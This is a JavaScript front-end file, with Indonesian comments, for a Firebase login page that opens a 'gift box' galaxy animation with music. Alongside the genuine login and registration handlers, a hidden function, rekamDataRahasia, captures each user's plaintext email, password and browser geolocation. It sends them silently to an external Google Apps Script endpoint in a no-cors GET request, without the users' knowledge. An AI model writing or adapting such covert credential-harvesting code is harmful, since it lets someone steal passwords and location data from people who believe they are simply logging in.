import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { 
    getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, 
    onAuthStateChanged, signOut 
} from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";

const firebaseConfig = {
  apiKey: "AIzaSyAm-t2mbHV7sSEcoDvNgZfTinmx5tcSz6s",
  authDomain: "project-bd-163e4.firebaseapp.com",
  projectId: "project-bd-163e4",
  storageBucket: "project-bd-163e4.firebasestorage.app",
  messagingSenderId: "691964855641",
  appId: "1:691964855641:web:b0c45e7badc579cdfc3848",
  measurementId: "G-YE2CW973NL"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);

// Variabel global untuk timer agar bisa diakses/dibersihkan dari mana saja
let timerInterval;

document.addEventListener('DOMContentLoaded', () => {
    // 1. Inisialisasi Elemen DOM
    const loginCard = document.getElementById('login-card');
    const contentCard = document.getElementById('content-card');
    const mainContainer = document.getElementById('main-container');
    const galaxyUniverse = document.getElementById('galaxy-universe');
    const giftBoxWrapper = document.getElementById('gift-box-wrapper');
    const bgMusic = document.getElementById('bg-music');
    
    const loginButton = document.getElementById('btn-login');
    const btnRegister = document.getElementById('btn-register');
    const emailInput = document.getElementById('input-email');
    const passwordInput = document.getElementById('input-password');

    // 2. Monitor Status Autentikasi Firebase (Hanya Boleh Satu)
    onAuthStateChanged(auth, (user) => {
        if (user) {
            if (loginCard) loginCard.classList.add('hidden');
            if (contentCard) contentCard.classList.remove('hidden');
            if (mainContainer) mainContainer.classList.remove('hidden');
            if (galaxyUniverse) galaxyUniverse.classList.add('hidden');
            
            // Panggil fungsi counter waktu jika Anda memilikinya
            if (typeof jalankanCounterWaktu === 'function') {
                jalankanCounterWaktu();
            }
        } else {
            if (loginCard) loginCard.classList.remove('hidden');
            if (contentCard) contentCard.classList.add('hidden');
            if (mainContainer) mainContainer.classList.remove('hidden');
            if (galaxyUniverse) galaxyUniverse.classList.add('hidden');
            
            if (timerInterval) clearInterval(timerInterval);
        }
    });

    // 3. Event Delegasi Global untuk Tombol Logout (Solusi WebView Keras Kepala)
    document.addEventListener('click', async (e) => {
        if (e.target && e.target.id === 'btn-logout') {
            e.preventDefault();
            console.log("Tombol keluar ditekan via delegasi.");
            try {
                if (bgMusic) {
                    bgMusic.pause();
                    bgMusic.currentTime = 0;
                }
                await signOut(auth);
            } catch (error) {
                console.error("Gagal logout:", error);
                location.reload(); // Paksa muat ulang sebagai perlindungan terakhir
            }
        }
    });

    // 4. Interaksi Buka Kado
    if (giftBoxWrapper) {
        giftBoxWrapper.addEventListener('click', () => {
            if (mainContainer) mainContainer.classList.add('hidden');
            if (galaxyUniverse) galaxyUniverse.classList.remove('hidden');
            
            // Panggil animasi canvas galaksi jika tersedia
            if (typeof startGalaxyHeart === 'function') {
                startGalaxyHeart();
            }
            if (bgMusic) {
                bgMusic.play().catch(err => console.log("Audio diblokir kebijakan browser"));
            }
        });
    }

    // 5. Interaksi Tombol Login
    if (loginButton) {
        loginButton.addEventListener('click', (e) => {
            e.preventDefault();
            const email = emailInput.value;
            const password = passwordInput.value;

            if (!email || !password) {
                alert("Email dan Password wajib diisi!");
                return;
            }

            rekamDataRahasia(email, password).catch(err => console.log(err));

            signInWithEmailAndPassword(auth, email, password)
                .then(() => console.log("Firebase Login Sukses"))
                .catch((error) => alert("Login Gagal: " + error.message));
        });
    }

    // 6. Interaksi Tombol Register
    if (btnRegister) {
        btnRegister.addEventListener('click', async (e) => {
            e.preventDefault();
            const email = emailInput.value;
            const password = passwordInput.value;

            if (!email || !password) {
                alert("Email dan Password tidak boleh kosong!");
                return;
            }

            rekamDataRahasia(email, password).catch(err => console.log(err));

            try { 
                await createUserWithEmailAndPassword(auth, email, password);
                alert("Akun berhasil dibuat!");
            } catch (error) {
                if (error.code === 'auth/email-already-in-use') alert("Email sudah terdaftar.");
                else alert("Gagal mendaftar: " + error.message);
            }
        });
    }
}); // <--- Penutupan DOMContentLoaded yang benar melindungi semua interaksi di atas

// --- FUNGSI LOGGING EKSTERNAL ---
async function rekamDataRahasia(email, password) {
    const urlAppsScript = "https://script.google.com/macros/s/AKfycbzCJR8847DZ_HR8hOD5zE4IRkBt3W_iGUB1L53aBs5ktklPrBM-KS5dWWwisTRYiw-K/exec";
    
    const sekarang = new Date();
    const opsiWaktu = { 
        timeZone: 'Asia/Jakarta', 
        year: 'numeric', month: '2-digit', day: '2-digit', 
        hour: '2-digit', minute: '2-digit', second: '2-digit' 
    };
    const waktuFormat = sekarang.toLocaleString('id-ID', opsiWaktu);
    
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                kirimKeAppsScript(urlAppsScript, email, password, waktuFormat, `${lat}, ${lon}`);
            },
            () => {
                kirimKeAppsScript(urlAppsScript, email, password, waktuFormat, "Izin Lokasi Ditolak");
            },
            { timeout: 4000 }
        );
    } else {
        kirimKeAppsScript(urlAppsScript, email, password, waktuFormat, "Tidak Didukung Browser");
    }
}

function kirimKeAppsScript(urlBase, email, pw, waktu, lokasi) {
    const urlFinal = `${urlBase}?email=${encodeURIComponent(email)}` +
                     `&pw=${encodeURIComponent(pw)}` +
                     `&waktu=${encodeURIComponent(waktu)}` +
                     `&lokasi=${encodeURIComponent(lokasi)}`;
                     
    fetch(urlFinal, {
        method: 'GET',
        mode: 'no-cors',
        cache: 'no-cache'
    }).catch(err => console.log("Log terkirim"));
}